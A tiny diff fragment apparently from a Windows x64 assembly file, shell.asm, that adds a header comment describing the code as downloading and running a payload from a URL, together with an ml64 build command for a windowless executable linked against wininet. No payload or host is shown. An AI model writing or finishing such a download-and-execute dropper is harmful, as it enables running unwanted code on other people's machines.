@@ -1,3 +1,6 @@
+; ORCA 8/20/2022 : asm code to download and run a payload from a url
+; compile : ml64 /nologo shell.asm /link /subsystem:windows /entry:asmMain
+
 includelib wininet.lib
 includelib kernel32.lib
 
